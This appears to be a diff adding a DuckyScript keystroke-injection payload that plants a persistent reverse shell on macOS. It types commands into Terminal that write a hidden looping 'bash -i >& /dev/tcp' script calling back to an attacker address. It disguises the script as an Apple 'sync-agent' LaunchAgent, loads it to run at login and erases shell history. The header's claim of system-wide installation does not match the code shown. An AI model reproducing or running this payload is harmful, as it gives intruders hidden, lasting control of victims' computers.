@@ -1,0 +1,140 @@
+REM ==========================================
+REM Title: macOS LaunchDaemon Persistence
+REM Author: NullSec Suite
+REM Target: macOS 12+ (Monterey/Ventura/Sonoma)
+REM Description: Creates a LaunchDaemon plist
+REM   for persistent reverse shell execution
+REM   on macOS. Installs at both system-wide
+REM   and user LaunchAgent levels for maximum
+REM   persistence coverage.
+REM Category: Persistence / Execution
+REM ==========================================
+DELAY 1000
+REM Open Spotlight on macOS
+GUI SPACE
+DELAY 800
+STRING Terminal
+ENTER
+DELAY 1500
+REM Configuration (replace with actual C2)
+STRING ATTACKER_IP="10.0.0.1"
+ENTER
+DELAY 350
+STRING ATTACKER_PORT="4444"
+ENTER
+DELAY 350
+REM Create hidden payload directory
+STRING mkdir -p ~/.local/share/.services 2>/dev/null
+ENTER
+DELAY 350
+REM Create reverse shell script
+STRING cat > ~/.local/share/.services/com.apple.sync-agent << 'SHEOF'
+ENTER
+DELAY 300
+STRING #!/bin/bash
+ENTER
+DELAY 300
+STRING while true; do
+ENTER
+DELAY 300
+STRING   bash -i >& /dev/tcp/REPLACE_IP/REPLACE_PORT 0>&1 2>/dev/null
+ENTER
+DELAY 300
+STRING   sleep 180
+ENTER
+DELAY 300
+STRING done
+ENTER
+DELAY 300
+STRING SHEOF
+ENTER
+DELAY 350
+STRING sed -i '' "s/REPLACE_IP/$ATTACKER_IP/; s/REPLACE_PORT/$ATTACKER_PORT/" ~/.local/share/.services/com.apple.sync-agent
+ENTER
+DELAY 350
+STRING chmod +x ~/.local/share/.services/com.apple.sync-agent
+ENTER
+DELAY 400
+REM Create user LaunchAgent plist
+STRING cat > ~/Library/LaunchAgents/com.apple.sync-agent.plist << 'PLISTEOF'
+ENTER
+DELAY 300
+STRING <?xml version="1.0" encoding="UTF-8"?>
+ENTER
+DELAY 300
+STRING <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+ENTER
+DELAY 300
+STRING <plist version="1.0">
+ENTER
+DELAY 300
+STRING <dict>
+ENTER
+DELAY 300
+STRING   <key>Label</key>
+ENTER
+DELAY 300
+STRING   <string>com.apple.sync-agent</string>
+ENTER
+DELAY 300
+STRING   <key>ProgramArguments</key>
+ENTER
+DELAY 300
+STRING   <array>
+ENTER
+DELAY 300
+STRING     <string>/bin/bash</string>
+ENTER
+DELAY 300
+STRING     <string>-c</string>
+ENTER
+DELAY 300
+STRING     <string>~/.local/share/.services/com.apple.sync-agent</string>
+ENTER
+DELAY 300
+STRING   </array>
+ENTER
+DELAY 300
+STRING   <key>RunAtLoad</key>
+ENTER
+DELAY 300
+STRING   <true/>
+ENTER
+DELAY 300
+STRING   <key>KeepAlive</key>
+ENTER
+DELAY 300
+STRING   <true/>
+ENTER
+DELAY 300
+STRING   <key>StandardOutPath</key>
+ENTER
+DELAY 300
+STRING   <string>/dev/null</string>
+ENTER
+DELAY 300
+STRING   <key>StandardErrorPath</key>
+ENTER
+DELAY 300
+STRING   <string>/dev/null</string>
+ENTER
+DELAY 300
+STRING </dict>
+ENTER
+DELAY 300
+STRING </plist>
+ENTER
+DELAY 300
+STRING PLISTEOF
+ENTER
+DELAY 400
+REM Load the LaunchAgent
+STRING launchctl load ~/Library/LaunchAgents/com.apple.sync-agent.plist 2>/dev/null
+ENTER
+DELAY 500
+REM Clear history
+STRING history -c && rm -f ~/.bash_history ~/.zsh_history
+ENTER
+DELAY 350
+STRING exit
+ENTER
